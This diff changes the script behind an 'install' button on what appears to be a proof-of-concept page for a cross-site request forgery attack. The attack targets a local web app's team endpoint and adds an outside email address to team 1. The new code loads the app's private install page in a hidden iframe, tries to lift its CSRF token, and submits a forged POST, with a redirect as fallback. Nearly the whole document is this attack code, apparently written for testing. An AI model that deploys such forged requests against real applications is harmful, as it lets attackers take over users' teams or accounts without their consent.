@@ -12,17 +12,38 @@
   <script>
     document.getElementById('installbutton').addEventListener('click', () => {
       console.log('Install button clicked');
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com';
-      const csrfInput = document.createElement('input');
-      csrfInput.type = 'hidden';
-      csrfInput.name = 'csrfToken';
-      csrfInput.value = 'dummy'; // Placeholder; will likely fail
-      form.appendChild(csrfInput);
-      document.body.appendChild(form);
-      form.submit();
-      console.log('Form submitted to change team for user1');
+      // Create an iframe to load the installation page
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'http://localhost:3000/apiv1/private/install';
+      document.body.appendChild(iframe);
+
+      iframe.onload = () => {
+        try {
+          // Attempt to access the form in the iframe (will fail due to SOP)
+          const form = iframe.contentDocument.querySelector('form');
+          if (form) {
+            const csrfInput = iframe.contentDocument.querySelector('input[name="csrfToken"]');
+            const csrfToken = csrfInput ? csrfInput.value : 'dummy';
+            // Create a form to submit to the team change endpoint
+            const submitForm = document.createElement('form');
+            submitForm.method = 'POST';
+            submitForm.action = 'http://localhost:3000/api/teams/1/addUser/blhd3hfy48@bltiwd.com';
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'csrfToken';
+            input.value = csrfToken;
+            submitForm.appendChild(input);
+            document.body.appendChild(submitForm);
+            submitForm.submit();
+            console.log('Form submitted with CSRF token:', csrfToken);
+          }
+        } catch (e) {
+          console.error('SOP error, falling back to redirect');
+          // Fallback: redirect to installation page to trigger any existing form
+          window.location.href = 'http://localhost:3000/apiv1/private/install';
+        }
+      };
     });
   </script>
 </body>
